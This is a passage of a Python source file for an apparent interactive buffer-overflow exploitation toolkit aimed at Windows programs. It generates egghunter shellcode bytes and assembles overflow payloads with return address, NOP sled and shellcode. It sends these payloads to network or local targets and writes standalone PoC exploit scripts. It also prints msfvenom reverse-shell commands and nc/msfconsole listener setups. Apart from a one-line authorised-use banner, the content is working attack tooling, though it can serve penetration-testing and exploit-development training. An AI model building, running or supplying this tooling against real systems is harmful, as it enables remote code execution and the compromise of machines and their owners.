    !mona nosafeseh          → modules without SafeSEH

  WinDbg:
    !nmod                    → list non-ASLR modules
    lm vm <module>           → check DLL characteristics
    !dh <base_addr>          → parse PE header flags

  PE-bear / CFF Explorer — DLL Characteristics:
    0x0040  DYNAMIC_BASE     (ASLR)
    0x0100  NX_COMPAT        (DEP)
    0x0400  NO_SEH
    0x4000  GUARD_CF         (Control Flow Guard)

  Process Hacker:
    Right-click process → Properties → Memory → check DEP status

  ── Bypass decision tree ────────────────────────────────────────────────
    No DEP, No ASLR   → Phase 6  (direct JMP ESP + shellcode)
    DEP only           → Phase 7  (VirtualProtect ROP chain)
    ASLR only          → find non-ASLR module, use Phase 6
    DEP + ASLR         → Phase 7 with gadgets from non-ASLR module
    SafeSEH            → Phase 8 using non-SafeSEH module gadget
    CFG                → must use valid indirect call targets only

  ── Useful mona ROP commands ────────────────────────────────────────────
    !mona rop -m "module.dll" -cpb '\\x00\\x0a\\x0d'
      → generates rop.txt with full VirtualProtect skeleton
    !mona ropfunc -m "module.dll"
      → lists useful API pointers in IAT
""")


# ─────────────────────────────────────────────────────────────────────────────
# PHASE 10 – EGGHUNTER
# ─────────────────────────────────────────────────────────────────────────────
def phase_egghunter():
    info("Phase 10 – Egghunter generation")
    tag = ask("4-char egg tag [w00t]: ") or "w00t"
    if len(tag) != 4: warn("Must be 4 chars — using 'w00t'"); tag = "w00t"
    egg = tag.encode() * 2
    egghunter = bytearray([
        0x66,0x81,0xca,0xff,0x0f, 0x42, 0x52, 0x6a,0x02, 0x58,
        0xcd,0x2e, 0x3c,0x05, 0x5a, 0x74,0xef, 0xb8,
    ])
    egghunter += tag.encode()
    egghunter += bytearray([0x8b,0xfa, 0xaf, 0x75,0xea, 0xaf, 0x75,0xe7, 0xff,0xe7])
    hex_str = "".join(f"\\x{b:02x}" for b in egghunter)
    good(f"Egghunter ({len(egghunter)} bytes) for tag '{tag}{tag}':")
    print(f'\n  egghunter = b"{hex_str}"\n')
    good(f"Prepend shellcode with: b\"{tag*2}\" + shellcode")
    return bytes(egghunter), egg


# ─────────────────────────────────────────────────────────────────────────────
# OPTION 11 – BUILD & FIRE (manual shellcode)
# ─────────────────────────────────────────────────────────────────────────────
def build_and_fire(state: dict):
    if state["offset"] is None or state["ret_addr"] is None:
        fail("Need offset (Phase 2) and return address (Phase 5) first."); return
    sc_hex = ask("Shellcode hex (no spaces/\\x): ")
    try:
        shellcode = bytes.fromhex(sc_hex.replace("\\x","").replace(" ","")) if sc_hex else b"\xcc"*4
    except ValueError:
        shellcode = b"\xcc"*4; warn("Bad hex — INT3 stub")
    nop = int(ask("NOP sled [16]: ") or "16")
    offset = state["offset"]; ret_addr = state["ret_addr"]; total = state["total_len"]
    used   = offset + 4 + nop + len(shellcode)
    filler = b"D" * max(0, total - used)
    payload = b"A"*offset + ret_addr + b"\x90"*nop + shellcode + filler
    good(f"Payload: {len(payload)} bytes")
    save_path = ask("Save to file (blank=skip): ")
    if save_path:
        with open(save_path,"wb") as f: f.write(payload); good(f"Saved → {save_path}")
    if state["target"]:
        if ask("Send now? [y/N]: ").lower() == "y":
            state["target"].send(payload, state["prefix"], state["suffix"])
            good("Sent — check listener!")


# ─────────────────────────────────────────────────────────────────────────────
# OPTION 12 – DISPLAY FINAL POC PAYLOAD BREAKDOWN
# ─────────────────────────────────────────────────────────────────────────────
def display_poc(state: dict):
    """
    Reconstruct and display the last-sent payload in full human-readable form
    suitable for copying into a PoC writeup or pentest report.
    Shows every component labelled, in Python bytes notation.
    """
    info("POC Payload Breakdown")
    print()

    if state["offset"] is None:
        fail("No offset set — run Phase 2 first."); return

    offset   = state["offset"]
    ret_addr = state["ret_addr"]
    prefix   = state["prefix"]
    suffix   = state["suffix"]
    bad_bytes= state["bad_bytes"]
    rop_chain= state.get("rop_chain", b"")
    shellcode= state.get("shellcode", b"")
    nop_sled = state.get("nop_sled", 16)
    total    = state["total_len"]

    # Reconstruct padding/filler
    used   = offset + (4 if ret_addr else 0) + len(rop_chain) + nop_sled + len(shellcode)
    filler = b"D" * max(0, total - used)

    sep = f"{CYAN}{'─'*72}{RESET}"

    print(sep)
    print(f"  {YELLOW}PoC Payload — Full Breakdown{RESET}")
    print(f"  Generated by BOF Toolkit v2.3")
    print(sep)
    print()

    # ── Header / config ───────────────────────────────────────────────────────
    print(f"  Target      : {state['target'] or 'manual'}")
    print(f"  Bad bytes   : {[hex(b) for b in state['bad_bytes']]}")
    print(f"  EIP offset  : {offset}")
    if ret_addr:
        print(f"  Return addr : {addr_display(ret_addr)}  →  {addr_escaped(ret_addr)}")
    print()

    # ── Python script representation ──────────────────────────────────────────
    print(sep)
    print(f"  {GREEN}Python PoC Script{RESET}")
    print(sep)
    print()

    lines = []
    lines.append("#!/usr/bin/env python3")
    lines.append("import socket, struct")
    lines.append("")
    lines.append(f"# Target")
    if isinstance(state["target"], NetworkTarget):
        lines.append(f'HOST = "{state["target"].host}"')
        lines.append(f'PORT = {state["target"].port}')
    else:
        lines.append('HOST = "127.0.0.1"')
        lines.append('PORT = 9999')
    lines.append("")

    # prefix
    if prefix:
        pfx_escaped = "".join(f"\\x{b:02x}" for b in prefix)
        lines.append(f'# Prefix  ({len(prefix)} bytes)')
        lines.append(f'prefix = b"{pfx_escaped}"')
    else:
        lines.append("prefix = b\"\"")
    lines.append("")

    # padding
    lines.append(f"# Padding to EIP  ({offset} bytes)")
    lines.append(f'padding = b"A" * {offset}')
    lines.append("")

    # return address
    if ret_addr:
        lines.append(f"# Return address — JMP ESP / ROP pivot")
        lines.append(f"# Debugger shows: {addr_display(ret_addr)}")
        lines.append(f'ret_addr = b"{addr_escaped(ret_addr)}"')
        lines.append("")

    # ROP chain
    if rop_chain:
        lines.append(f"# VirtualProtect ROP chain  ({len(rop_chain)} bytes)")
        lines.append("rop_chain = (")
        chunk_size = 8
        chunks = [rop_chain[i:i+chunk_size] for i in range(0, len(rop_chain), chunk_size)]
        for i, chunk in enumerate(chunks):
            escaped = "".join(f"\\x{b:02x}" for b in chunk)
            comma = "" if i == len(chunks)-1 else ""
            lines.append(f'    b"{escaped}"')
        lines.append(")")
        lines.append("")

    # NOP sled
    if nop_sled > 0:
        lines.append(f"# NOP sled  ({nop_sled} bytes)")
        lines.append(f'nop_sled = b"\\x90" * {nop_sled}')
        lines.append("")

    # shellcode
    if shellcode:
        lines.append(f"# Shellcode  ({len(shellcode)} bytes)")
        lines.append(f"# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 ...")
        lines.append("shellcode = (")
        sc_chunks = [shellcode[i:i+16] for i in range(0, len(shellcode), 16)]
        for chunk in sc_chunks:
            escaped = "".join(f"\\x{b:02x}" for b in chunk)
            lines.append(f'    b"{escaped}"')
        lines.append(")")
        lines.append("")

    # filler
    if len(filler) > 0:
        lines.append(f"# Filler / padding  ({len(filler)} bytes)")
        lines.append(f'filler = b"D" * {len(filler)}')
        lines.append("")

    # suffix
    if suffix:
        sfx_escaped = "".join(f"\\x{b:02x}" for b in suffix)
        lines.append(f"# Suffix  ({len(suffix)} bytes)")
        lines.append(f'suffix = b"{sfx_escaped}"')
        lines.append("")

    # assemble
    components = ["padding"]
    if ret_addr:    components.append("ret_addr")
    if rop_chain:   components.append("rop_chain")
    if nop_sled:    components.append("nop_sled")
    if shellcode:   components.append("shellcode")
    if len(filler): components.append("filler")

    lines.append("# Assemble")
    lines.append(f"payload = {' + '.join(components)}")
    lines.append("")
    lines.append("# Send")
    lines.append("with socket.socket() as s:")
    lines.append('    s.connect((HOST, PORT))')
    if prefix:
        lines.append('    s.sendall(prefix + payload + suffix)' if suffix else
                     '    s.sendall(prefix + payload)')
    else:
        lines.append('    s.sendall(payload + suffix)' if suffix else
                     '    s.sendall(payload)')
    lines.append('    print("[+] Payload sent")')

    for line in lines:
        print(f"    {line}")

    print()
    print(sep)

    # ── Byte-level summary ────────────────────────────────────────────────────
    print(f"  {GREEN}Payload Component Summary{RESET}")
    print(sep)
    total_bytes = (len(prefix) + offset +
                   (4 if ret_addr else 0) +
                   len(rop_chain) + nop_sled + len(shellcode) + len(filler) + len(suffix))
    rows = []
    if prefix:    rows.append(("Prefix",          len(prefix),   repr(prefix[:20]) + ("..." if len(prefix)>20 else "")))
    rows.append(  ("Padding (A's)",  offset,        f"b'A' × {offset}"))
    if ret_addr:  rows.append(("Return address",   4,             f"{addr_display(ret_addr)} → {addr_escaped(ret_addr)}"))
    if rop_chain: rows.append(("ROP chain",         len(rop_chain), f"{len(rop_chain)} bytes (VirtualProtect skeleton)"))
    if nop_sled:  rows.append(("NOP sled",          nop_sled,      f"b'\\x90' × {nop_sled}"))
    if shellcode: rows.append(("Shellcode",          len(shellcode), f"{len(shellcode)} bytes"))
    if len(filler):rows.append(("Filler (D's)",     len(filler),   f"b'D' × {len(filler)}"))
    if suffix:    rows.append(("Suffix",             len(suffix),   repr(suffix)))

    col_w = [max(len(r[0]) for r in rows)+2, 10, 60]
    header = f"  {'Component':<{col_w[0]}}{'Bytes':>{col_w[1]}}   {'Content / Notes'}"
    print(header)
    print(f"  {'─'*col_w[0]}{'─'*col_w[1]}   {'─'*40}")
    for name, size, note in rows:
        print(f"  {name:<{col_w[0]}}{size:>{col_w[1]}}   {note}")
    print(f"  {'─'*col_w[0]}{'─'*col_w[1]}")
    print(f"  {'TOTAL':<{col_w[0]}}{total_bytes:>{col_w[1]}}")
    print()
    print(sep)

    # ── Save to file ──────────────────────────────────────────────────────────
    save = ask("Save PoC script to .py file (blank=skip): ")
    if save:
        poc_text = "\n".join(lines) + "\n"
        with open(save, "w") as f:
            f.write(poc_text)
        good(f"PoC script saved → {save}")


# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def _listener_prompt(lhost, lport, ptype):
    print()
    print(f"  {YELLOW}╔══ START LISTENER BEFORE SENDING ══════════════════════════╗{RESET}")
    print(f"  {YELLOW}║{RESET}  nc -lvnp {lport}")
    print(f"  {YELLOW}║{RESET}  — or —")
    print(f"  {YELLOW}║{RESET}  msfconsole -q -x 'use multi/handler; \\")
    print(f"  {YELLOW}║{RESET}    set payload {ptype}; \\")
    print(f"  {YELLOW}║{RESET}    set LHOST {lhost}; set LPORT {lport}; run'")
    print(f"  {YELLOW}╚════════════════════════════════════════════════════════════╝{RESET}")
    print()
    input("  [Press Enter once listener is ready]")


def _parse_msfvenom_python_output(output: str) -> Optional[bytes]:
    result = bytearray()
    for line in output.splitlines():
        line = line.strip()
        for quote in ('"', "'"):
            marker = f"b{quote}"
            start = line.find(marker)
            if start == -1: continue
            start += len(marker); end = line.rfind(quote)
            if end <= start: continue
            content = line[start:end]; i = 0
            while i < len(content):
                if content[i:i+2] == "\\x" and i+4 <= len(content):
                    try: result.append(int(content[i+2:i+4], 16)); i += 4
                    except ValueError: i += 1
                else: i += 1
            break
    return bytes(result) if result else None


def _manual_shellcode_mode(offset, ret_addr, bad_bytes, prefix, suffix,
                           total_length, target, nop_sled):
    bad_hex = "".join(f"\\x{b:02x}" for b in sorted(bad_bytes))
    print()
    info("Generate shellcode manually:")
    print(f"  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 "
          f"-b '{bad_hex}' -f python -v shellcode\n")
    sc_hex = ask("Paste shellcode hex: ")
    if not sc_hex: fail("No shellcode."); return None
    try: shellcode = bytes.fromhex(sc_hex.replace("\\x","").replace(" ",""))
    except ValueError: fail("Bad hex."); return None
    nops   = b"\x90" * nop_sled
    used   = offset + 4 + nop_sled + len(shellcode)
    filler = b"D" * max(0, total_length - used)
    payload = b"A"*offset + ret_addr + nops + shellcode + filler
    good(f"Payload: {len(payload)} bytes")
    if target:
        if ask("Send now? [y/N]: ").lower() == "y":
            target.send(payload, prefix, suffix); good("Sent!")
    return payload


# ─────────────────────────────────────────────────────────────────────────────
# INTERACTIVE MENU
# ─────────────────────────────────────────────────────────────────────────────
def get_target(state: dict):
    print()
    print("    1. Network TCP/UDP socket")
    print("    2. Local EXE (stdin or file)")
    print("    3. Manual — no auto-send")
    choice = ask("Choice [1/2/3]: ")
    state["prefix"], state["suffix"] = get_affixes()
    target = None
    if choice == "1":
        host = ask("Host/IP: "); port = int(ask("Port: "))
        proto = ask("Protocol [tcp]: ") or "tcp"
        target = NetworkTarget(host, port, proto); good(f"Target: {target}")
    elif choice == "2":
        exe = ask("EXE path: "); via_f = ask("Payload file (blank=stdin): ") or None
        target = LocalProcessTarget(exe, via_file=via_f); good(f"Target: {target}")
    else:
        warn("Manual mode.")
    total = ask("Total payload length [2000]: ")
    state["total_len"] = int(total) if total else 2000
    state["target"] = target; good("Configured.")


def print_state(state: dict):
    tgt = str(state["target"]) if state["target"] else "not configured"
    pfx = repr(state["prefix"]) if state["prefix"] else "none"
    sfx = repr(state["suffix"]) if state["suffix"] else "none"
    if state["ret_addr"]:
        le = state["ret_addr"]
        ra_str = f"{addr_display(le)}  →  {addr_escaped(le)}"
    else:
        ra_str = "not set"
    rop_status = f"{len(state.get('rop_chain',b''))} bytes" if state.get("rop_chain") else "not built"
    sc_status  = f"{len(state.get('shellcode',b''))} bytes" if state.get("shellcode") else "not set"
    print(f"\n{CYAN}{'─'*72}{RESET}")
    print(f"  Target      : {tgt}")
    print(f"  Prefix      : {pfx}   Suffix: {sfx}")
    print(f"  Total len   : {state['total_len']}   Crash: {state['crash_bytes']}")
    print(f"  EIP offset  : {state['offset']}   Bad bytes: {[hex(b) for b in state['bad_bytes']]}")
    print(f"  Return addr : {ra_str}")
    print(f"  ROP chain   : {rop_status}   Shellcode: {sc_status}")
    print(f"{CYAN}{'─'*72}{RESET}")


def main():
    banner()

    state = {
        "target":      None,
        "prefix":      b"",
        "suffix":      b"",
        "crash_bytes": None,
        "offset":      None,
        "bad_bytes":   b"\x00",
        "ret_addr":    None,
        "total_len":   2000,
        "rop_chain":   b"",
        "shellcode":   b"",
        "nop_sled":    16,
    }

    menu_items = [
        (" 1", "Configure target + prefix/suffix"),
        (" 2", "Phase 1   – Fuzz for crash length"),
        (" 3", "Phase 2   – Find EIP offset                [works without Phase 1]"),
        (" 4", "Phase 3   – Verify EIP control (BBBB test)"),
        (" 5", "Phase 4   – Bad character analysis"),
        (" 6", "Phase 5   – Set return address (JMP ESP)"),
        (" 7", "Phase 6   – Shellcode + fire               [no DEP/ASLR]"),
        (" 8", "Phase 7   – DEP + ASLR bypass (VirtualProtect ROP chain)  ← NEW"),
        (" 9", "Phase 8   – SEH chain overwrite"),
        ("10", "Phase 9   – Mitigation recon hints"),
        ("11", "Phase 10  – Egghunter generator"),
        ("12", "Build & fire  (manual shellcode paste)"),
        ("13", "Display PoC payload breakdown  ← copy for report / writeup"),
        (" 0", "Exit"),
    ]

    while True:
        print_state(state)
        for num, label in menu_items:
            print(f"  {num}.  {label}")
        print()
        choice = ask("Select option: ")

        if choice == "0":
            info("Exiting."); break

        elif choice == "1":
            get_target(state)

        elif choice == "2":
            if state["target"] is None:
                fail("Configure target first (option 1)."); continue
            start = int(ask("Start [100]: ") or "100")
            step  = int(ask("Step  [100]: ") or "100")
            mx    = int(ask("Max [10000]: ") or "10000")
            result = phase_fuzz(state["target"], state["prefix"],
                                state["suffix"], start, step, mx)
            if result:
                state["crash_bytes"] = result
                state["total_len"]   = result + 400

        elif choice == "3":
            offset = phase_find_offset(state["crash_bytes"],
                                       state["prefix"], state["suffix"],
                                       state["target"])
            if offset is not None:
                state["offset"] = offset
                if state["crash_bytes"] is None: state["crash_bytes"] = offset + 400
                state["total_len"] = max(state["total_len"], offset + 600)

        elif choice == "4":
            if state["offset"] is None: fail("Run Phase 2 first."); continue
            phase_verify_eip(state["offset"], state["prefix"],
                             state["suffix"], state["total_len"], state["target"])

        elif choice == "5":
            if state["offset"] is None: fail("Run Phase 2 first."); continue
            state["bad_bytes"] = phase_bad_chars(
                state["offset"], state["prefix"], state["suffix"],
                state["total_len"], state["target"], state["bad_bytes"])

        elif choice == "6":
            if state["offset"] is None: fail("Run Phase 2 first."); continue
            result = phase_set_return_address(
                state["offset"], state["prefix"], state["suffix"],
                state["total_len"], state["target"])
            if result and result[1] is not None:
                _, state["ret_addr"] = result

        elif choice == "7":
            if state["offset"] is None: fail("Need offset (Phase 2)."); continue
            if state["ret_addr"] is None: fail("Need return addr (Phase 5)."); continue
            payload = phase_shellcode_and_fire(
                state["offset"], state["ret_addr"], state["bad_bytes"],
                state["prefix"], state["suffix"], state["total_len"], state["target"])
            # Store shellcode in state for PoC display
            if payload and len(payload) > state["offset"] + 4 + state["nop_sled"]:
                sc_start = state["offset"] + 4 + state["nop_sled"]
                state["shellcode"] = payload[sc_start:sc_start + (len(payload) - state["offset"] - 4 - state["nop_sled"])]

        elif choice == "8":
            if state["offset"] is None: fail("Need offset (Phase 2)."); continue
            if state["ret_addr"] is None: fail("Need return addr (Phase 5) as ROP pivot."); continue
            result = phase_dep_aslr_bypass(
                state["offset"], state["ret_addr"], state["bad_bytes"],
                state["prefix"], state["suffix"], state["total_len"],
                state["target"], state["nop_sled"])
            if result:
                payload, rop_chain = result
                state["rop_chain"] = rop_chain

        elif choice == "9":
            phase_seh_overwrite(state["prefix"], state["suffix"], state["target"])

        elif choice == "10":
            phase_mitigation_check()

        elif choice == "11":
            result = phase_egghunter()

        elif choice == "12":
            build_and_fire(state)

        elif choice == "13":
            display_poc(state)

        else:
            warn("Unknown option.")


# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"{YELLOW}[LEGAL]{RESET} Authorised security testing only.")
    print(f"        Obtain written permission before testing any target.\n")
    main()
